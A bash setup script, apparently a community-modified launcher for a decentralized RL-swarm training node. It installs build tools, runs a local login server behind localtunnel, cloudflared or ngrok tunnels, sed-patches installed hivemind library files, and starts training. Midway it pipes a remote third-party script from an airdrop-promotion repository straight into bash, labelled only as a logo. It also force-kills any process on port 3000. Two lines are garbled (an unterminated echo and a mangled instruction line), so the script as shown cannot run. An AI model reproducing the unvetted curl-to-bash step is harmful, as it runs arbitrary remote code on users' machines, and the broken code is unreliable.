#!/bin/bash

ROOT=$PWD

export PUB_MULTI_ADDRS
export PEER_MULTI_ADDRS
export HOST_MULTI_ADDRS
export IDENTITY_PATH
export ORG_ID
export HF_HUB_DOWNLOAD_TIMEOUT=120
export TUNNEL_TYPE=""
export CPU_ONLY=true  

DEFAULT_PUB_MULTI_ADDRS=""
PUB_MULTI_ADDRS=${PUB_MULTI_ADDRS:-$DEFAULT_PUB_MULTI_ADDRS}

DEFAULT_PEER_MULTI_ADDRS="/ip4/38.101.215.13/tcp/30002/p2p/QmQ2gEXoPJg6iMBSUFWGzAabS2VhnzuS782Y637hGjfsRJ"
PEER_MULTI_ADDRS=${PEER_MULTI_ADDRS:-$DEFAULT_PEER_MULTI_ADDRS}

DEFAULT_HOST_MULTI_ADDRS="/ip4/0.0.0.0/tcp/38331"
HOST_MULTI_ADDRS=${HOST_MULTI_ADDRS:-$DEFAULT_HOST_MULTI_ADDRS}

DEFAULT_IDENTITY_PATH="$ROOT"/swarm.pem
IDENTITY_PATH=${IDENTITY_PATH:-$DEFAULT_IDENTITY_PATH}

SMALL_SWARM_CONTRACT="0x69C6e1D608ec64885E7b185d39b04B491a71768C"
BIG_SWARM_CONTRACT="0x6947c6E196a48B77eFa9331EC1E3e45f3Ee5Fd58"

if [[ "$OSTYPE" == "linux-gnu"* ]]; then
  if command -v apt &>/dev/null; then
    echo "[✓] Debian/Ubuntu detected. Installing build-essential, gcc, g++..."
    sudo apt update > /dev/null 2>&1
    sudo apt install -y build-essential gcc g++ > /dev/null 2>&1

  elif command -v yum &>/dev/null; then
    echo "[✓] RHEL/CentOS detected. Installing Development Tools..."
    sudo yum groupinstall -y "Development Tools" > /dev/null 2>&1
    sudo yum install -y gcc gcc-c++ > /dev/null 2>&1

  elif command -v pacman &>/dev/null; then
    echo "[✓] Arch Linux detected. Installing base-devel..."
    sudo pacman -Sy --noconfirm base-devel gcc > /dev/null 2>&1

  else
    echo "[✗] Linux detected but unsupported package manager."
    exit 1
  fi

elif [[ "$OSTYPE" == "darwin"* ]]; then
  echo "[✓] macOS detected. Installing Xcode Command Line Tools..."
  xcode-select --install > /dev/null 2>&1

else
  echo "[✗] Unsupported OS: $OSTYPE"
  exit 1
fi

if command -v gcc &>/dev/null; then
  export CC=$(command -v gcc)
  echo "[✓] Exported CC=$CC"
else
  echo "[✗] gcc not found. Please install it manually."
fi

# CPU-only
echo "[✓] Running in CPU-only mode"

while true; do
    # Prompt the user
    echo "Please select a swarm to join:\n[A] Math\n[B] Math Hard"
    read -p "> " ab
    ab=${ab:-A}  # Default to "A" if Enter is pressed

    case $ab in
        [Aa]*)  USE_BIG_SWARM=false; break ;;
        [Bb]*)  USE_BIG_SWARM=true; break ;;
        *)      echo ">>> Please answer A or B." ;;
    esac
done

if [ "$USE_BIG_SWARM" = true ]; then
    SWARM_CONTRACT="$BIG_SWARM_CONTRACT"
else
    SWARM_CONTRACT="$SMALL_SWARM_CONTRACT"
fi

while true; do
    echo "How many parameters (in billions)? [0.5, 1.5, 7, 32, 72]"
    read -p "> " pc
    pc=${pc:-0.5}  # Default to "0.5" if the user presses Enter

    case $pc in
        0.5 | 1.5 | 7 | 32 | 72) PARAM_B=$pc; break ;;
        *) echo ">>> Please answer in [0.5, 1.5, 7, 32, 72]." ;;
    esac
done

cleanup() {
    echo "[✓] Shutting down processes..."
    kill $SERVER_PID 2>/dev/null || true
    kill $TUNNEL_PID 2>/dev/null || true
    exit 0
}

trap cleanup INT

# logo dari URL
curl -s https://raw.githubusercontent.com/choir94/Airdropguide/refs/heads/main/logo.sh | bash
echo "JOIN THE COMMUNITY : https://t.me/airdrop_node"
sleep 3

if [ -f "modal-login/temp-data/userData.json" ]; then
    cd modal-login

    echo "[✓] Installing dependencies with npm. This may take a few minutes, depending on your internet speed..."
    npm install --legacy-peer-deps
    
    echo "[✓] Starting the development server..."
    if ! command -v ss &>/dev/null; then
      echo "[!] 'ss' not found. Attempting to install 'iproute2'..."
      if command -v apt &>/dev/null; then
        sudo apt update && sudo apt install -y iproute2
      elif command -v yum &>/dev/null; then
        sudo yum install -y iproute
      elif command -v pacman &>/dev/null; then
        sudo pacman -Sy iproute2
      else
        echo "[✗] Could not install 'ss'. Package manager not found."
        exit 1
      fi
    fi
    
    PORT_LINE=$(ss -ltnp | grep ":3000 ")
    if [ -n "$PORT_LINE" ]; then
      PID=$(echo "$PORT_LINE" | grep -oP 'pid=\K[0-9]+')
      if [ -n "$PID" ]; then
        echo "[!] Port 3000 is in use. Killing process: $PID"
        kill -9 $PID
        sleep 2
      fi
    fi
    
    npm run dev > server.log 2>&1 &
    SERVER_PID=$!
    MAX_WAIT=30  
    
    for ((i = 0; i < MAX_WAIT; i++)); do
        if grep -q "Local:        http://localhost:" server.log; then
            PORT=$(grep "Local:        http://localhost:" server.log | sed -n 's/.*http:\/\/localhost:\([0-9]*\).*/\1/p')
            if [ -n "$PORT" ]; then
                echo "[✓] Server is running successfully on port $PORT."
                break
            fi
        fi
        sleep 1
    done
    
    if [ $i -eq $MAX_WAIT ]; then
        echo "[✗] Timeout waiting for server to start."
        kill $SERVER_PID 2>/dev/null || true
        exit 1
    fi
    
    cd ..

    ORG_ID=$(awk 'BEGIN { FS = "\"" } !/^[ \t]*[{}]/ { print $(NF - 1); exit }' modal-login/temp-data/userData.json)
    echo "[✓] ORG_ID has been set to: $ORG_ID"
else
    cd modal-login

    echo "[✓] Installing dependencies with npm. This may take a few minutes, depending on your internet speed..."
    npm install --legacy-peer-deps
    
    echo "[✓] Starting the development server..."
    if ! command -v ss &>/dev/null; then
      echo "[!] 'ss' not found. Attempting to install 'iproute2'..."
      if command -v apt &>/dev/null; then
        sudo apt update && sudo apt install -y iproute2
      elif command -v yum &>/dev/null; then
        sudo yum install -y iproute
      elif command -v pacman &>/dev/null; then
        sudo pacman -Sy iproute2
      else
        echo "[✗] Could not install 'ss'. Package manager not found."
        exit 1
      fi
    fi
    
    PORT_LINE=$(ss -ltnp | grep ":3000 ")
    if [ -n "$PORT_LINE" ]; then
      PID=$(echo "$PORT_LINE" | grep -oP 'pid=\K[0-9]+')
      if [ -n "$PID" ]; then
        echo "[!] Port 3000 is in use. Killing process: $PID"
        kill -9 $PID
        sleep 2
      fi
    fi
    
    npm run dev > server.log 2>&1 &
    SERVER_PID=$!
    MAX_WAIT=30  
    
    for ((i = 0; i < MAX_WAIT; i++)); do
        if grep -q "Local:        http://localhost:" server.log; then
            PORT=$(grep "Local:        http://localhost:" server.log | sed -n 's/.*http:\/\/localhost:\([0-9]*\).*/\1/p')
            if [ -n "$PORT" ]; then
                echo "[✓] Server is running successfully on port $PORT."
                break
            fi
        fi
        sleep 1
    done
    
    if [ $i -eq $MAX_WAIT ]; then
        echo "[✗] Timeout waiting for server to start."
        kill $SERVER_PID 2>/dev/null || true
        exit 1
    fi

    echo "[✓] Detecting system architecture..."
    ARCH=$(uname -m)
    OS=$(uname -s | tr '[:upper:]' '[:lower:]')
    if [ "$ARCH" = "x86_64" ]; then
        NGROK_ARCH="amd64"
        CF_ARCH="amd64"
        echo "[✓] Detected x86_64 architecture."
    elif [ "$ARCH" = "arm64" ] || [ "$ARCH" = "aarch64" ]; then
        NGROK_ARCH="arm64"
        CF_ARCH="arm64"
        echo "[✓] Detected ARM64 architecture."
    elif [[ "$ARCH" == arm* ]]; then
        NGROK_ARCH="arm"
        CF_ARCH="arm"
        echo "[✓] Detected ARM architecture."
    else
        echo "[✗] Unsupported architecture: $ARCH. Please use a supported system."
        exit 1
    fi

    check_url() {
        local url=$1
        local max_retries=3
        local retry=0
        
        while [ $retry -lt $max_retries ]; do
            http_code=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
            if [ "$http_code" = "200" ] || [ "$http_code" = "404" ] || [ "$http_code" = "301" ] || [ "$http_code" = "302" ]; then
                return 0
            fi
            retry=$((retry + 1))
            sleep 2
        done
        return 1
    }

    install_localtunnel() {
        if command -v lt >/dev/null 2>&1; then
            echo "[✓] Localtunnel is already installed."
            return 0
        fi
        echo "[✓] Installing localtunnel..."
        npm install -g localtunnel > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo "[✓] Localtunnel installed successfully."
            return 0
        else
            echo "[✗] Failed to install localtunnel."
            return 1
        fi
    }

    install_cloudflared() {
        if command -v cloudflared >/dev/null 2>&1; then
            echo "[✓] Cloudflared is already installed."
            return 0
        fi
        echo "[✓] Installing cloudflared..."
        CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$CF_ARCH"
        wget -q --show-progress "$CF_URL" -O cloudflared
        if [ $? -ne 0 ]; then
            echo "[✗] Failed to download cloudflared."
            return 1
        fi
        chmod +x cloudflared
        sudo mv cloudflared /usr/local/bin/
        if [ $? -ne 0 ]; then
            echo "[✗] Failed to move cloudflared to /usr/local/bin/."
            return 1
        fi
        echo "[✓] Cloudflared installed successfully."
        return 0
    }

    install_ngrok() {
        if command -v ngrok >/dev/null 2>&1; then
            echo "[✓] ngrok is already installed."
            return 0
        fi
        echo "[✓] Installing ngrok..."
        NGROK_URL="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-$OS-$NGROK_ARCH.tgz"
        wget -q --show-progress "$NGROK_URL" -O ngrok.tgz
        if [ $? -ne 0 ]; then
            echo "[✗] Failed to download ngrok."
            return 1
        fi
        tar -xzf ngrok.tgz
        if [ $? -ne 0 ]; then
            echo "[✗] Failed to extract ngrok."
            rm ngrok.tgz
            return 1
        fi
        sudo mv ngrok /usr/local/bin/
        if [ $? -ne 0 ]; then
            echo "[✗] Failed to move ngrok to /usr/local/bin/."
            rm ngrok.tgz
            return 1
        fi
        rm ngrok.tgz
        echo "[✓] ngrok installed successfully."
        return 0
    }

    try_localtunnel() {
        echo "[✓] Trying localtunnel..."
        if install_localtunnel; then
            echo "[✓] Starting localtunnel on port $PORT..."
            TUNNEL_TYPE="localtunnel"
            lt --port $PORT > localtunnel_output.log 2>&1 &
            TUNNEL_PID=$!
            
            sleep 5
            URL=$(grep -o "https://[^ ]*" localtunnel_output.log | head -n1)
            
            if [ -n "$URL" ]; then
                PASS=$(curl -s https://loca.lt/mytunnelpassword)
                FORWARDING_URL="$URL"
                echo "[✓] Success! Please visit this website : $URL and then enter this password : $PASS to access the website and then log in using your email."
                return 0
            else
                echo "[✗] Failed to get localtunnel URL."
                kill $TUNNEL_PID 2>/dev/null || true
            fi
        fi
        return 1
    }

    try_cloudflared() {
        echo "[✓] Trying cloudflared..."
        if install_cloudflared; then
            echo "[編輯
            echo "[✓] Starting cloudflared tunnel..."
            TUNNEL_TYPE="cloudflared"
            cloudflared tunnel --url http://localhost:$PORT > cloudflared_output.log 2>&1 &
            TUNNEL_PID=$!
            
            counter=0
            MAX_WAIT=10
            while [ $counter -lt $MAX_WAIT ]; do
                CLOUDFLARED_URL=$(grep -o 'https://[^ ]*\.trycloudflare.com' cloudflared_output.log | head -n1)
                if [ -n "$CLOUDFLARED_URL" ]; then
                    echo "[✓] Cloudflared tunnel is started successfully."
                    echo "[✓] Checking if cloudflared URL is working..."
                    if check_url "$CLOUDFLARED_URL"; then
                        FORWARDING_URL="$CLOUDFLARED_URL"
                        return 0
                    else
                        echo "[✗] Cloudflared URL is not accessible."
                        kill $TUNNEL_PID 2>/dev/null || true
                        break
                    fi
                fi
                sleep 1
                counter=$((counter + 1))
            done
            kill $TUNNEL_PID 2>/dev/null || true
        fi
        return 1
    }

    get_ngrok_url_method1() {
        local url=$(grep -o '"url":"https://[^"]*' ngrok_output.log 2>/dev/null | head -n1 | cut -d'"' -f4)
        echo "$url"
    }

    get_ngrok_url_method2() {
        local try_port
        local url=""
        for try_port in $(seq 4040 4045); do
            local response=$(curl -s "http://localhost:$try_port/api/tunnels" 2>/dev/null)
            if [ -n "$response" ]; then
                url=$(echo "$response" | grep -o '"public_url":"https://[^"]*' | head -n1 | cut -d'"' -f4)
                if [ -n "$url" ]; then
                    break
                fi
            fi
        done
        echo "$url"
    }

    get_ngrok_url_method3() {
        local url=$(grep -o "Forwarding.*https://[^ ]*" ngrok_output.log 2>/dev/null | grep -o "https://[^ ]*" | head -n1)
        echo "$url"
    }

    try_ngrok() {
        echo "[✓] Trying ngrok..."
        if install_ngrok; then
            TUNNEL_TYPE="ngrok"
            while true; do
                echo "To get your authtoken:"
                echo "1. Sign up or log in at https://dashboard.ngrok.com"
                echo "2. Go to 'Your Authtoken' section: https://dashboard.ngrok.com/get-started/your-authtoken"
                echo "3. Click on the eye icon to reveal your ngrok auth token"
                echo "4. Copy that auth token and paste it in the prompt below"
                echo "Please enter your ngrok authtoken:"
                read -p "> " NGROK_TOKEN
            
                if [ -z "$NGROK_TOKEN" ]; then
                    echo "[✗] No token provided. Please enter a valid token."
                    continue
                fi
                pkill -f ngrok || true
                sleep 2
            
                ngrok authtoken "$NGROK_TOKEN" 2>/dev/null
                if [ $? -eq 0 ]; then
                    echo "[✓] Successfully authenticated ngrok!"
                    break
                else
                    echo "[✗] Authentication failed. Please check your token and try again."
                fi
            done

            echo "[✓] Starting ngrok with method 1..."
            ngrok http "$PORT" --log=stdout --log-format=json > ngrok_output.log 2>&1 &
            TUNNEL_PID=$!
            sleep 5
            
            NGROK_URL=$(get_ngrok_url_method1)
            if [ -n "$NGROK_URL" ]; then
                FORWARDING_URL="$NGROK_URL"
                return 0
            else
                echo "[✗] Failed to get ngrok URL (method 1)."
                kill $TUNNEL_PID 2>/dev/null || true
            fi

            echo "[✓] Starting ngrok with method 2..."
            ngrok http "$PORT" > ngrok_output.log 2>&1 &
            TUNNEL_PID=$!
            sleep 5
            
            NGROK_URL=$(get_ngrok_url_method2)
            if [ -n "$NGROK_URL" ]; then
                FORWARDING_URL="$NGROK_URL"
                return 0
            else
                echo "[✗] Failed to get ngrok URL (method 2)."
                kill $TUNNEL_PID 2>/dev/null || true
            fi

            echo "[✓] Starting ngrok with method 3..."
            ngrok http "$PORT" --log=stdout > ngrok_output.log 2>&1 &
            TUNNEL_PID=$!
            sleep 5
            
            NGROK_URL=$(get_ngrok_url_method3)
            if [ -n "$NGROK_URL" ]; then
                FORWARDING_URL="$NGROK_URL"
                return 0
            else
                echo "[✗] Failed to get ngrok URL (method 3)."
                kill $TUNNEL_PID 2>/dev/null || true
            fi
        fi
        return 1
    }

    start_tunnel() {
        if try_localtunnel; then
            return 0
        fi
        
        if try_cloudflared; then
            return 0
        fi
        
        if try_ngrok; then
            return 0
        fi
        return 1
    }

    start_tunnel
    if [ $? -eq 0 ]; then
        if [ "$TUNNEL_TYPE" != "localtunnel" ]; then
            echo "[✓] Success! Please visit this website and log in using your email: $FORWARDING_URL"
        fi
    else
        echo "[✓] Don't worry, you can use this manual method. Please follow these instructions:"
        echo "1. Open this same WSL/VPS or GPU server on another tab"
        echo "2. Paste this command into this terminal: ngrok http $PORT"
        echoing a link similar to this: https://xxxx.ngrok-free.app"
        echo "4. Visit this website and login using your email, this website may take 30 sec to load."
        echo "5. Now go back to the previous tab, you will see everything will run fine"
    fi

    cd ..

    echo "[↻] Waiting for you to complete the login process..."
    while [ ! -f "modal-login/temp-data/userData.json" ]; do
        sleep 3
    done
    
    echo "[✓] Success! The userData.json file has been created. Proceeding with remaining setups..."
    rm -f server.log localtunnel_output.log cloudflared_output.log ngrok_output.log

    ORG_ID=$(awk 'BEGIN { FS = "\"" } !/^[ \t]*[{}]/ { print $(NF - 1); exit }' modal-login/temp-data/userData.json)
    echo "[✓] ORG_ID has been set to: $ORG_ID"

    echo "[✓] Waiting for API key to become activated..."
    while true; do
        STATUS=$(curl -s "http://localhost:3000/api/get-api-key-status?orgId=$ORG_ID")
        if [[ "$STATUS" == "activated" ]]; then
            echo "[✓] Success! API key is activated! Proceeding..."
            break
        else
            echo "[↻] Waiting for API key to be activated..."
            sleep 5
        fi
    done

    ENV_FILE="$ROOT"/modal-login/.env
    if [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS version
        sed -i '' "3s/.*/SMART_CONTRACT_ADDRESS=$SWARM_CONTRACT/" "$ENV_FILE"
    else
        # Linux version
        sed -i "3s/.*/SMART_CONTRACT_ADDRESS=$SWARM_CONTRACT/" "$ENV_FILE"
    fi
fi

echo "[✓] Setting up Python virtual environment..."
python3 -m venv .venv && . .venv/bin/activate && \
echo "[✓] Python virtual environment set up successfully." || \
echo "[✗] Failed to set up virtual environment."

# Luôn sử dụng config CPU và cài đặt requirements-cpu.txt
echo "[✓] Using CPU configuration"
pip install -r "$ROOT"/requirements-cpu.txt
CONFIG_PATH="$ROOT/hivemind_exp/configs/mac/grpo-qwen-2.5-0.5b-deepseek-r1.yaml"
GAME="gsm8k"
echo "[✓] Config file : $CONFIG_PATH"

if [ -n "${HF_TOKEN}" ]; then
    HUGGINGFACE_ACCESS_TOKEN=${HF_TOKEN}
else
    read -p "Would you like to push models you train in the RL swarm to the Hugging Face Hub? [y/N] " yn
    yn=${yn:-N}
    case $yn in
        [Yy]* ) read -p "Enter your Hugging Face access token: " HUGGINGFACE_ACCESS_TOKEN;;
        [Nn]* ) HUGGINGFACE_ACCESS_TOKEN="None";;
        * ) echo ">>> No answer was given, so NO models will be pushed to the Hugging Face Hub." && HUGGINGFACE_ACCESS_TOKEN="None";;
    esac
fi

echo "[✓] Good luck in the swarm! Your training session is about to begin."
[ "$(uname)" = "Darwin" ] && sed -i '' -E 's/(startup_timeout: *float *= *)[0-9.]+/\1120/' $(python3 -c "import hivemind.p2p.p2p_daemon as m; print(m.__file__)") || sed -i -E 's/(startup_timeout: *float *= *)[0-9.]+/\1120/' $(python3 -c "import hivemind.p2p.p2p_daemon as m; print(m.__file__)")
[ "$(uname)" = "Darwin" ] && sed -i '' -e '/bootstrap_timeout: Optional\[float\] = None/s//bootstrap_timeout: float = 120/' $(python3 -c 'import hivemind.dht.node as m; print(m.__file__)') || sed -i -e '/bootstrap_timeout: Optional\[float\] = None/s//bootstrap_timeout: float = 120/' $(python3 -c 'import hivemind.dht.node as m; print(m.__file__)')
if [ -n "$ORG_ID" ]; then
    python -m hivemind_exp.gsm8k.train_single_gpu \
        --hf_token "$HUGGINGFACE_ACCESS_TOKEN" \
        --identity_path "$IDENTITY_PATH" \
        --modal_org_id "$ORG_ID" \
        --contract_address "$SWARM_CONTRACT" \
        --config "$CONFIG_PATH" \
        --game "$GAME"
else
    python -m hivemind_exp.gsm8k.train_single_gpu \
        --hf_token "$HUGGINGFACE_ACCESS_TOKEN" \
        --identity_path "$IDENTITY_PATH" \
        --public_maddr "$PUB_MULTI_ADDRS" \
        --initial_peers "$PEER_MULTI_ADDRS" \
        --host_maddr "$HOST_MULTI_ADDRS" \
        --config "$CONFIG_PATH" \
        --game "$GAME"
fi

wait
